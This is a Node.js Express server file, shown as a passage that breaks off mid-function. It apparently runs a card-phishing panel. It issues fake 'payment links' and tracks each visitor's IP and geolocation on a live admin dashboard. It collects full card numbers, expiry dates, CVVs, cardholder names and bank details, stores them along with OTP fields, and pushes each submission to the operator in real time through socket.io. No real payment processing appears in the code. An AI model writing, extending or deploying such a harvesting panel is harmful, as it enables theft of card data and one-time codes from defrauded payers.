import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';
import fetch from 'node-fetch'; // Make sure this is installed

// Add this at the top of your server.js file after your imports
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Add right after your imports (import express, bodyParser, etc.)
console.log('=== APPLICATION STARTUP ===');
console.log('Current directory:', __dirname);
try {
  const files = fs.readdirSync(__dirname);
  console.log('Files in directory:', files);
  
  // Specifically check for our problematic files
  const criticalFiles = ['success.html', 'fail.html', 'bankpage.html', 'currencypayment.html'];
  criticalFiles.forEach(file => {
    const exists = fs.existsSync(path.join(__dirname, file));
    console.log(`${file} exists: ${exists}`);
  });
} catch (error) {
  console.error('Error reading directory:', error);
}

// Add this at the top of your server.js file after defining __dirname
console.log('=== CHECKING FOR HTML FILES ===');
const htmlFiles = ['success.html', 'fail.html', 'bankpage.html', 'currencypayment.html'];
htmlFiles.forEach(file => {
  const filePath = path.join(__dirname, file);
  const exists = fs.existsSync(filePath);
  console.log(`${file} exists: ${exists}, path: ${filePath}`);
});
// ADD THE ERROR HANDLERS HERE - right after imports
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
  // Keep the process running despite the error
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  // Keep the process running despite the rejection
});

// Generate a unique ID for this server instance
const SERVER_ID = crypto.randomBytes(3).toString('hex');

// Store visitors with last activity timestamp
const visitors = new Map();
const VISITOR_TIMEOUT = 60000; // 60 seconds timeout for inactive visitors

// Store manually expired payment links
const expiredLinks = new Set();

// Create HTML redirect files
function createRedirectFile(targetHtml) {
  const fileName = `pay${SERVER_ID}.html`;
  const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0;url=/${targetHtml}?${Date.now()}">
  <script>
    window.location.href = '/${targetHtml}' + window.location.search;
  </script>
</head>
<body>
  <p>Loading...</p>
</body>
</html>
`;

  fs.writeFileSync(fileName, redirectHtml);
  console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
  return fileName;
}

// Create a redirect file for landing.html
const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');

// Initialize Express app
const app = express();
app.use(bodyParser.json());
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));
// Add after CORS setup but before health check
// Find this line: app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
// And add this code right after it:

// Request logging middleware - ADD THIS RIGHT AFTER CORS SETUP
app.use((req, res, next) => {
  console.log(`[REQUEST DEBUG] ${new Date().toISOString()} - ${req.method} ${req.url}`);
  
  // Check for specific paths we're having trouble with
  if (req.path === '/success.html' || req.path === '/fail.html' || 
      req.path === '/bankpage.html' || req.path === '/currencypayment.html' || 
      /^\/[a-zA-Z0-9]{6}$/.test(req.path)) {
    console.log(`[CRITICAL PATH DEBUG] Detected critical path: ${req.path}`);
    console.log(`Query params:`, req.query);
    console.log(`Headers:`, req.headers);
  }
  
  next();
});

// ADD THE HEALTH CHECK ENDPOINT HERE - right after app initialization
app.get('/health', (req, res) => {
  const healthcheck = {
    uptime: process.uptime(),
    message: 'OK',
    timestamp: Date.now(),
    environment: process.env.NODE_ENV || 'development',
    serverID: SERVER_ID
  };
  try {
    // Check critical components
    // Check if socket.io is initialized
    if (io) {
      healthcheck.socketio = 'OK';
    }
    
    console.log('Health check called:', healthcheck);
    res.status(200).send(healthcheck);
  } catch (error) {
    console.error('Health check failed:', error);
    healthcheck.message = error;
    res.status(500).send(healthcheck);
  }
});

// Helper function to check if a payment link is expired
function getPaymentIdFromUrl(url) {
  if (!url) return null;
  
  try {
    // Extract pid from URL query params
    const params = new URLSearchParams(url.split('?')[1]);
    return params.get('pid');
  } catch (error) {
    console.error('Error extracting pid from URL:', error);
    return null;
  }
}

// Helper to check if a link is expired - FIXED VERSION
function isLinkExpired(pid) {
  if (!pid) return false;
  
  // Check if it's manually expired
  if (expiredLinks.has(pid)) {
    return true;
  }
  
  // Check if it exists and check automatic expiration (15 hours)
  if (paymentLinks.has(pid)) {
    const payment = paymentLinks.get(pid);
    
    // Make sure we have a valid createdAt timestamp
    if (!payment.createdAt) {
      console.log(`Payment link ${pid} has no createdAt timestamp, treating as not expired`);
      return false;
    }
    
    // Parse the timestamp correctly - ISO string format can sometimes cause issues
    let createdAt;
    try {
      createdAt = new Date(payment.createdAt).getTime();
    } catch (e) {
      console.error(`Error parsing timestamp for pid ${pid}:`, e);
      return false; // Don't expire if we can't parse the timestamp
    }
    
    const now = new Date().getTime();
    const timeDiff = now - createdAt;
    
    // Log the time difference for debugging
    console.log(`Payment link ${pid} time diff: ${timeDiff / (60 * 60 * 1000)} hours`);
    
    // 15 hours in milliseconds = 54000000
    if (timeDiff > 54000000) {
      console.log(`Payment link ${pid} expired due to time: created ${new Date(createdAt).toISOString()}, now ${new Date(now).toISOString()}`);
      return true;
    }
  }
  
  return false;
}

// Track visitors middleware and check for expired links - IMPROVED TO AVOID EARLY EXPIRATION
app.use((req, res, next) => {
  // Extract pid from the URL query parameters
  const pid = req.query.pid;
  
  // Check if the URL contains a pid and if that link is expired - IMPORTANT to check first
  if (pid) {
    // Direct check of link expiration before any other processing
    if (isLinkExpired(pid)) {
      console.log(`Expired link access detected for pid: ${pid}`);
      
      // Check if this is an API call (to avoid redirect loops)
      if (req.path.startsWith('/api/')) {
        // For API calls, just continue and let the API handle it
        next();
        return;
      }
      
      // For any page request (landing.html, payment.html, etc), redirect to expired
      console.log(`Redirecting expired link to expired.html`);
      return res.redirect('/expired.html');
    }
    
    // Track this visit without causing expiration
    if (paymentLinks.has(pid)) {
      const payment = paymentLinks.get(pid);
      if (!payment.visits) payment.visits = 0;
      payment.visits++;
      
      // Log the visit count
      console.log(`Payment link ${pid} visits: ${payment.visits}`);
    }
    
    // Continue with normal visitor tracking only if not expired
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const timestamp = new Date().toLocaleString();
    const lastActive = Date.now();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Check if this is a new visitor or an update
    const isNewVisitor = !visitors.has(pid);
    
    // Store visitor info with lastActive timestamp and user agent
    const visitor = { 
      pid,
      ip, 
      timestamp,
      url: req.originalUrl,
      lastActive,
      userAgent
    };
    
    visitors.set(pid, visitor);
    
    // Notify admin if this is a new visitor
    if (isNewVisitor && io) {
      io.emit('visitor', visitor);
    }
    
    // Process location data for this visitor
    fetchGeoData(ip).then(geoData => {
      // Rest of your existing visitor tracking code remains unchanged
      const updatedVisitor = visitors.get(pid);
      if (updatedVisitor) {
        // Add geoData as a nested object to match what admin.html expects
        updatedVisitor.geoData = {
          city: geoData.city,
          country: geoData.country,
          countryCode: geoData.countryCode,
          region: geoData.region,
          isp: geoData.isp,
          org: geoData.org,
          lat: geoData.lat,
          lon: geoData.lon,
          browser: getBrowserInfo(userAgent).browser,
          os: getBrowserInfo(userAgent).os,
          device: getBrowserInfo(userAgent).device
        };
        
        visitors.set(pid, updatedVisitor);
        
        // Tell admin panel we have updated this visitor
        if (io) {
          io.emit('visitor_updated', updatedVisitor);
        }
      }
    }).catch(err => {
      console.error('Error fetching geo data:', err);
    });
  }
  
  // Block direct access to payment.html and currencypayment.html
  if ((req.path === '/payment.html' || req.path === '/currencypayment.html') && !req.query.pid) {
    return res.status(404).sendFile(path.join(__dirname, '404.html'));
  }
  
  next();
});
// Redirect handlers for problematic HTML files
app.get('/success.html', (req, res) => {
  console.log('Redirecting success.html to success-page.html with query params:', req.query);
  // Preserve all query parameters in the redirect
  const queryString = Object.keys(req.query).length > 0 
    ? '?' + new URLSearchParams(req.query).toString() 
    : '';
  res.redirect(`/success-page.html${queryString}`);
});

app.get('/fail.html', (req, res) => {
  console.log('Redirecting fail.html to fail-page.html with query params:', req.query);
  const queryString = Object.keys(req.query).length > 0 
    ? '?' + new URLSearchParams(req.query).toString() 
    : '';
  res.redirect(`/fail-page.html${queryString}`);
});

app.get('/bankpage.html', (req, res) => {
  console.log('Redirecting bankpage.html to bankpage-page.html with query params:', req.query);
  const queryString = Object.keys(req.query).length > 0 
    ? '?' + new URLSearchParams(req.query).toString() 
    : '';
  res.redirect(`/bankpage-page.html${queryString}`);
});

app.get('/currencypayment.html', (req, res) => {
  console.log('Redirecting currencypayment.html to currency-page.html with query params:', req.query);
  const queryString = Object.keys(req.query).length > 0 
    ? '?' + new URLSearchParams(req.query).toString() 
    : '';
  res.redirect(`/currency-page.html${queryString}`);
});

// Add a special route for API redirects that have shortcodes
app.use((req, res, next) => {
  // Check if the URL might be a shortcode URL but wasn't caught by earlier routes
  const path = req.path;
  const isShortCode = /^\/[a-zA-Z0-9]{6}$/.test(path);
  
  if (isShortCode) {
    console.log('Caught possible shortcode URL in middleware:', path);
    // If it's a shortcode URL, try to process it
    const shortCode = path.substring(1);
    const pid = req.query.pid;
    
    if (pid) {
      console.log(`Redirecting shortcode ${shortCode} with pid ${pid} to landing.html`);
      return res.redirect(`/landing.html?pid=${pid}`);
    }
  }
  
  next();
});
// Add this route before your other routes to handle payment links
app.get('/:shortCode', (req, res, next) => {
  const shortCode = req.params.shortCode;
  const pid = req.query.pid;
  
  // Skip if this is a known route or file
  if (shortCode.includes('.') || 
      ['api', 'landing', 'payment', 'admin', 'success', 'fail', 'expired', 'health'].includes(shortCode)) {
    return next();
  }
  
  console.log(`Processing short link: /${shortCode}?pid=${pid}`);
  
  // If we have a pid, redirect to landing page with the pid
  if (pid && pid.length > 0) {
    return res.redirect(`/landing.html?pid=${pid}`);
  }
  
  // If no pid but we have a short code, try to look it up (if you have a mapping mechanism)
  // Otherwise just continue to the next middleware/route
  next();
});
// Special page handlers for success, fail, and currency payment pages
app.get('/success.html', (req, res) => {
  const filePath = path.resolve(__dirname, 'success.html');
  console.log(`Serving success.html from: ${filePath}`);
  
  // Check if file exists before sending
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    console.error(`success.html not found at: ${filePath}`);
    return res.status(200).send(`
      <html>
        <head><title>Payment Successful</title></head>
        <body>
          <h1>Payment Successful</h1>
          <p>Your payment has been processed successfully.</p>
          <p>Invoice ID: ${req.query.invoiceId || 'Not provided'}</p>
        </body>
      </html>
    `);
  }
});

app.get('/fail.html', (req, res) => {
  const filePath = path.resolve(__dirname, 'fail.html');
  console.log(`Serving fail.html from: ${filePath}`);
  
  // Check if file exists before sending
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    console.error(`fail.html not found at: ${filePath}`);
    return res.status(200).send(`
      <html>
        <head><title>Payment Failed</title></head>
        <body>
          <h1>Payment Failed</h1>
          <p>Your payment could not be processed.</p>
          <p>Reason: ${req.query.reason || 'Unknown error'}</p>
          <p>Invoice ID: ${req.query.invoiceId || 'Not provided'}</p>
        </body>
      </html>
    `);
  }
});

app.get('/currencypayment.html', (req, res) => {
  const filePath = path.resolve(__dirname, 'currencypayment.html');
  console.log(`Serving currencypayment.html from: ${filePath}`);
  
  // Check if file exists before sending
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    console.error(`currencypayment.html not found at: ${filePath}`);
    return res.redirect(`/payment.html?pid=${req.query.pid}`);
  }
});

app.get('/bankpage.html', (req, res) => {
  const filePath = path.resolve(__dirname, 'bankpage.html');
  console.log(`Serving bankpage.html from: ${filePath}`);
  
  // Check if file exists before sending
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    console.error(`bankpage.html not found at: ${filePath}`);
    return res.status(200).send(`
      <html>
        <head><title>Bank Verification</title></head>
        <body>
          <h1>Bank Verification</h1>
          <p>Please wait while we verify your payment details.</p>
          <p>Invoice ID: ${req.query.invoiceId || 'Not provided'}</p>
        </body>
      </html>
    `);
  }
});
// Get browser info from user agent
function getBrowserInfo(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Unknown';
  
  // Detect browser
  if (userAgent.includes('Firefox')) browser = 'Firefox';
  else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
  else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
  else if (userAgent.includes('Edg')) browser = 'Edge';
  else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
  else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browser = 'Opera';
  
  // Detect OS
  if (userAgent.includes('Windows')) os = 'Windows';
  else if (userAgent.includes('Mac OS')) os = 'macOS';
  else if (userAgent.includes('Linux') && !userAgent.includes('Android')) os = 'Linux';
  else if (userAgent.includes('Android')) os = 'Android';
  else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
  
  // Detect device
  if (userAgent.includes('iPhone')) device = 'iPhone';
  else if (userAgent.includes('iPad')) device = 'iPad';
  else if (userAgent.includes('Android') && userAgent.includes('Mobile')) device = 'Android Phone';
  else if (userAgent.includes('Android') && !userAgent.includes('Mobile')) device = 'Android Tablet';
  else if ((userAgent.includes('Windows') || userAgent.includes('Mac OS') || userAgent.includes('Linux')) && 
           !userAgent.includes('Mobile')) device = 'Desktop';
  
  return { browser, os, device };
}

// Fetch geolocation data
async function fetchGeoData(ip) {
  // Default data for errors or local IPs
  const defaultData = {
    city: 'Unknown',
    country: 'Unknown',
    countryCode: 'UN',
    region: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    lat: 0,
    lon: 0
  };
  
  // Don't lookup local IPs
  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
    defaultData.city = 'Local';
    defaultData.country = 'Local';
    defaultData.countryCode = 'LO';
    defaultData.isp = 'Local Network';
    defaultData.org = 'Local Network';
    return defaultData;
  }
  
  try {
    // Clean IP if needed (remove port numbers, etc)
    const cleanIp = ip.split(',')[0].trim();
    
    // Try ipwho.is API first - more reliable and higher rate limits
    const response = await fetch(`https://ipwho.is/${cleanIp}`);
    
    if (!response.ok) {
      throw new Error(`IP lookup failed with status ${response.status}`);
    }
    
    const data = await response.json();
    
    // Check for API errors
    if (!data.success) {
      throw new Error(data.message || 'IP API error');
    }
    
    return {
      city: data.city || defaultData.city,
      country: data.country || defaultData.country,
      countryCode: data.country_code || defaultData.countryCode,
      region: data.region || defaultData.region,
      isp: data.connection?.isp || defaultData.isp,
      org: data.connection?.org || defaultData.org,
      lat: data.latitude || defaultData.lat,
      lon: data.longitude || defaultData.lon
    };
  } catch (ipwhoError) {
    console.error('Error with ipwho.is API:', ipwhoError);
    console.log('Trying fallback API...');
    
    // Fallback to ipapi.co
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      
     if (!response.ok) {
        throw new Error(`IP lookup failed with status ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.error) {
        throw new Error(data.error);
      }
      
      return {
        city: data.city || defaultData.city,
        country: data.country_name || defaultData.country,
        countryCode: data.country_code || defaultData.countryCode,
        region: data.region || defaultData.region,
        isp: data.org || data.asn || defaultData.isp,
        org: data.org || defaultData.org,
        lat: data.latitude || defaultData.lat,
        lon: data.longitude || defaultData.lon
      };
    } catch (fallbackError) {
      console.error('Error with fallback API:', fallbackError);
      return defaultData;
    }
  }
}

// Heartbeat endpoint for active visitors to ping
app.post('/api/visitor-heartbeat', (req, res) => {
  const { pid } = req.body;
  
  if (pid && visitors.has(pid)) {
    const visitor = visitors.get(pid);
    visitor.lastActive = Date.now();
    visitors.set(pid, visitor);
    return res.json({ success: true });
  }
  
  res.status(400).json({ success: false });
});

// Clean up inactive visitors periodically
function cleanupInactiveVisitors() {
  const now = Date.now();
  let removed = 0;
  
 visitors.forEach((visitor, pid) => {
    if (now - visitor.lastActive > VISITOR_TIMEOUT) {
      visitors.delete(pid);
      removed++;
      
      // Notify admin that visitor has left
      if (io) {
        io.emit('visitor_left', { pid });
      }
    }
  });
  
  if (removed > 0) {
    console.log(`Removed ${removed} inactive visitors`);
  }
}
// Add this right BEFORE your static file serving line: app.use(express.static("."));
// But AFTER your visitor tracking middleware

// Direct file serving middleware for problematic HTML files
app.use((req, res, next) => {
  // Check for our problem files
  if (req.path === '/success.html' || req.path === '/fail.html' || 
      req.path === '/bankpage.html' || req.path === '/currencypayment.html') {
    
    const fileName = req.path.substring(1); // Remove leading slash
    console.log(`[DIRECT FILE SERVER] Attempting to serve ${fileName} directly`);
    
    try {
      // Try to read the file directly
      const filePath = path.resolve(__dirname, fileName);
      
      if (fs.existsSync(filePath)) {
        console.log(`[DIRECT FILE SERVER] File ${fileName} exists at ${filePath}`);
        
        // Read the file content
        const fileContent = fs.readFileSync(filePath, 'utf8');
        
        // Set appropriate headers
        res.setHeader('Content-Type', 'text/html');
        res.setHeader('Cache-Control', 'no-cache');
        
        // Send the file content directly
        return res.send(fileContent);
      } else {
        console.error(`[DIRECT FILE SERVER] File ${fileName} NOT FOUND at ${filePath}`);
        
        // Create a directory listing to see what files are available
        const directoryContents = fs.readdirSync(__dirname);
        console.log(`[DIRECT FILE SERVER] Directory contents:`, directoryContents);
        
        return next();
      }
    } catch (error) {
      console.error(`[DIRECT FILE SERVER] Error serving ${fileName}:`, error);
      return next();
    }
  }
  
  // Handle shortcode URLs
  if (/^\/[a-zA-Z0-9]{6}$/.test(req.path)) {
    const shortCode = req.path.substring(1);
    const pid = req.query.pid;
    
    console.log(`[SHORTCODE HANDLER] Processing ${shortCode} with pid ${pid}`);
    
    if (pid) {
      console.log(`[SHORTCODE HANDLER] Redirecting to landing.html?pid=${pid}`);
      return res.redirect(`/landing.html?pid=${pid}`);
    }
  }
  
  next();
});

// Direct HTML file serving with proper error handling
// Add this before your static serving middleware
// Make sure to place this AFTER your middleware for visitor tracking but BEFORE your static file serving

// Success page
app.get('/success.html', (req, res) => {
  console.log('Explicitly serving success.html, params:', req.query);
  
  // Create absolute path to the file
  const filePath = path.join(__dirname, 'success.html');
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    console.error(`ERROR: success.html not found at ${filePath}`);
    return res.status(404).send('File not found: success.html');
  }
  
  // Read the file directly
  try {
    const html = fs.readFileSync(filePath, 'utf8');
    
    // Set proper content-type and send
    res.set('Content-Type', 'text/html');
    return res.send(html);
  } catch (err) {
    console.error('Error reading success.html:', err);
    return res.status(500).send('Error reading file');
  }
});

// Fail page
app.get('/fail.html', (req, res) => {
  console.log('Explicitly serving fail.html, params:', req.query);
  
  // Create absolute path to the file
  const filePath = path.join(__dirname, 'fail.html');
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    console.error(`ERROR: fail.html not found at ${filePath}`);
    return res.status(404).send('File not found: fail.html');
  }
  
  // Read the file directly
  try {
    const html = fs.readFileSync(filePath, 'utf8');
    
    // Set proper content-type and send
    res.set('Content-Type', 'text/html');
    return res.send(html);
  } catch (err) {
    console.error('Error reading fail.html:', err);
    return res.status(500).send('Error reading file');
  }
});

// Bankpage
app.get('/bankpage.html', (req, res) => {
  console.log('Explicitly serving bankpage.html, params:', req.query);
  
  // Create absolute path to the file
  const filePath = path.join(__dirname, 'bankpage.html');
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    console.error(`ERROR: bankpage.html not found at ${filePath}`);
    return res.status(404).send('File not found: bankpage.html');
  }
  
  // Read the file directly
  try {
    const html = fs.readFileSync(filePath, 'utf8');
    
    // Set proper content-type and send
    res.set('Content-Type', 'text/html');
    return res.send(html);
  } catch (err) {
    console.error('Error reading bankpage.html:', err);
    return res.status(500).send('Error reading file');
  }
});

// Currencypayment page
app.get('/currencypayment.html', (req, res) => {
  console.log('Explicitly serving currencypayment.html, params:', req.query);
  
  // Create absolute path to the file
  const filePath = path.join(__dirname, 'currencypayment.html');
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    console.error(`ERROR: currencypayment.html not found at ${filePath}`);
    return res.status(404).send('File not found: currencypayment.html');
  }
  
  // Read the file directly
  try {
    const html = fs.readFileSync(filePath, 'utf8');
    
    // Set proper content-type and send
    res.set('Content-Type', 'text/html');
    return res.send(html);
  } catch (err) {
    console.error('Error reading currencypayment.html:', err);
    return res.status(500).send('Error reading file');
  }
});

// Add a route for any other HTML files that might be problematic
app.get('/:filename.html', (req, res, next) => {
  const filename = req.params.filename;
  
  // Skip our already-handled files
  if (['success', 'fail', 'bankpage', 'currencypayment'].includes(filename)) {
    return next();
  }
  
  console.log(`Handling .html request for: ${filename}.html`);
  
  // Create absolute path to the file
  const filePath = path.join(__dirname, `${filename}.html`);
  
  // Check if file exists
  if (!fs.existsSync(filePath)) {
    console.log(`HTML file not found, continuing to next handler: ${filePath}`);
    return next();
  }
  
  // Read the file directly
  try {
    const html = fs.readFileSync(filePath, 'utf8');
    
    // Set proper content-type and send
    res.set('Content-Type', 'text/html');
    return res.send(html);
  } catch (err) {
    console.error(`Error reading ${filename}.html:`, err);
    return next();
  }
});

// Handle shortcode URLs (like /vi0vbj)
app.get(/^\/[a-zA-Z0-9]{6}$/, (req, res, next) => {
  const shortCode = req.path.substring(1);
  const pid = req.query.pid;
  
  console.log(`Handling shortcode URL: ${shortCode}, pid: ${pid}`);
  
  if (pid) {
    console.log(`Redirecting shortcode ${shortCode} to landing.html with pid ${pid}`);
    return res.redirect(`/landing.html?pid=${pid}`);
  }
  
  next();
});
// Serve static files
app.use(express.static(path.join(__dirname, '.')));

// Routes for hash-based URLs
app.get('/p/:hash/bankpage', (req, res) => {
  console.log('Serving bankpage via hash URL');
  const invoiceId = req.query.invoiceId;
  // Redirect to the actual HTML file with the query parameters
  res.redirect(`/bankpage.html${invoiceId ? `?invoiceId=${invoiceId}` : ''}`);
});

app.get('/p/:hash/success', (req, res) => {
  console.log('Serving success via hash URL');
  const invoiceId = req.query.invoiceId;
  // Redirect to the actual HTML file with the query parameters
  res.redirect(`/success.html${invoiceId ? `?invoiceId=${invoiceId}` : ''}`);
});

app.get('/p/:hash/fail', (req, res) => {
  console.log('Serving fail via hash URL');
  const invoiceId = req.query.invoiceId;
  const reason = req.query.reason;
  
  let queryString = '';
  if (invoiceId || reason) {
    queryString = '?';
    if (invoiceId) queryString += `invoiceId=${invoiceId}`;
    if (invoiceId && reason) queryString += '&';
    if (reason) queryString += `reason=${reason}`;
  }
  
  // Redirect to the actual HTML file with the query parameters
  res.redirect(`/fail.html${queryString}`);
});

app.get('/p/:hash/currency', (req, res) => {
  console.log('Serving currency via hash URL');
  // Pass along all query parameters
  const queryString = Object.keys(req.query).length > 0 
    ? '?' + new URLSearchParams(req.query).toString() 
    : '';
  
  // Redirect to the actual HTML file with the query parameters
  res.redirect(`/currencypayment.html${queryString}`);
});
// CRITICAL: Updated PORT and server configuration for Railway
const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Server environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
  
  // Start the cleanup interval for inactive visitors
  setInterval(cleanupInactiveVisitors, 10000); // Check every 10 seconds
});

const io = new Server(server);
const transactions = new Map();
const paymentLinks = new Map();

// Track admin sockets separately
const adminSockets = new Set();

// Endpoint to get active visitor info
app.get('/api/visitors', (req, res) => {
  try {
    // Clean up any inactive visitors first
    cleanupInactiveVisitors();
    
    // Convert the Map to an Array of objects (only active visitors)
    const visitorList = Array.from(visitors.values());
    
    return res.json(visitorList);
  } catch (error) {
    console.error('Error getting visitors:', error);
    return res.status(500).json({ error: 'Failed to get visitors' });
  }
});

// Endpoint to get the pid for a transaction
app.get('/api/getTransactionPid', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  
  if (!txn) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // Find the payment link that corresponds to this transaction
  let pid = null;
  paymentLinks.forEach((payment, paymentId) => {
    if (payment.amount === parseFloat(txn.amount)) {
      pid = paymentId;
    }
  });
  
  res.json({ pid });
});

// Payment Links Endpoints - FIXED VERSION
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount" });
    }

    if (!description?.trim()) {
      return res.status(400).json({ status: "error", message: "Description required" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    
    // Generate payment link that works with both www and non-www domains
    // Get the base domain without www if it exists
    let baseHost = host;
    if (host.startsWith('www.')) {
      baseHost = host.substring(4); // Remove 'www.' prefix
    }
    
    // Use the redirect file instead of landing.html
    const paymentLink = `${protocol}://${baseHost}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}`;

    // Create the current timestamp properly and log it
    const now = new Date();
    const createdAt = now.toISOString();
    console.log(`Creating payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()})`);

    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: createdAt,
      // Add a property to track visits without expiring
      visits: 0
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// Free Payment Links Endpoint
app.post('/api/generateFreeLink', (req, res) => {
  try {
    const { description, isFreeLink } = req.body;

    // Only description is optional for free links
    if (!isFreeLink) {
      return res.status(400).json({ status: "error", message: "Invalid free link request" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.get('host');
    
    // Generate payment link that works with both www and non-www domains
    // Get the base domain without www if it exists
    let baseHost = host;
    if (host.startsWith('www.')) {
      baseHost = host.substring(4); // Remove 'www.' prefix
    }
    
    // Use the redirect file instead of landing.html
    const paymentLink = `${protocol}://${baseHost}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}`;

    // Create the current timestamp properly and log it
    const now = new Date();
    const createdAt = now.toISOString();
    console.log(`Creating free payment link ${invoiceId} with timestamp: ${createdAt} (${now.getTime()})`);

    paymentLinks.set(invoiceId, {
      amount: 0, // Zero amount since user will enter their own
      description: description?.trim() || "Enter your payment amount",
      paymentLink,
      createdAt: createdAt,
      isFreeLink: true, // Mark as a free link
      visits: 0
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Free Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// New endpoint to manually expire a payment link
app.post('/api/expirePaymentLink', (req, res) => {
  const { pid } = req.body;
  
  if (!pid) {
    return res.status(400).json({ status: "error", message: "Payment ID (pid) is required" });
  }
  
  // The pid might be the full link or just the ID portion
  let paymentId = pid;
  
  // Check if the input is a URL
  if (pid.includes('://') || pid.includes('?pid=')) {
    try {
      // Try to extract the pid from the URL
      let url;
      if (pid.includes('?pid=')) {
        // If it's a query parameter format
        const pidParam = pid.split('?pid=')[1];
        paymentId = pidParam.split('&')[0]; // Get just the pid part
      } else {
        // If it's a full URL
        url = new URL(pid);
        const urlParams = new URLSearchParams(url.search);
        paymentId = urlParams.get('pid');
      }
    } catch (error) {
      console.error('Error parsing URL:', error);
      // Continue with the original pid if parsing fails
    }
  }
  
  console.log(`Attempting to expire payment link with ID: ${paymentId}`);
  
  // Check if the payment link exists
  if (!paymentLinks.has(paymentId)) {
    return res.status(404).json({ status: "error", message: "Payment link not found" });
  }
  
  // Mark the link as expired
  expiredLinks.add(paymentId);
  
  console.log(`Payment link manually expired: ${paymentId}`);
  
  res.json({ 
    status: "success", 
    message: "Payment link has been expired successfully" 
  });
});

// Modified endpoint with link expiration check and free link handling
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Not found" });
  }
  
  // Use the consistent expiration check
  if (isLinkExpired(pid)) {
    return res.status(410).json({ status: "error", message: "Payment link has expired" });
  }
  
  const payment = paymentLinks.get(pid);
  
  // Check for free=true in the request query for backward compatibility
  const isFreeLink = req.query.free === 'true' || payment.isFreeLink === true;
  
  // If this is a free link, update the response to indicate that
  if (isFreeLink) {
    payment.isFreeLink = true;
  }
  
  res.json({ status: "success", payment });
});

// Transactions Endpoints - Modified to handle bank info
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder, bankInfo } = req.body;

    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
      return res.status(400).json({ status: "error", message: "Missing fields" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Parse bank info if present
    let parsedBankInfo = null;
    try {
      if (bankInfo) {
        parsedBankInfo = JSON.parse(bankInfo);
      }
    } catch (e) {
      console.error('Error parsing bank info:', e);
    }

    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency,
      cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toLocaleString(),
      ip: ip,
      bankInfo: parsedBankInfo // Add bank info
    };

    transactions.set(invoiceId, transaction);
    
    // Emit both events for compatibility
    io.emit('new_transaction');
    
    // Add card_submitted event with transaction data for real-time updates in admin panel
    io.emit('card_submitted', {
      invoiceId,
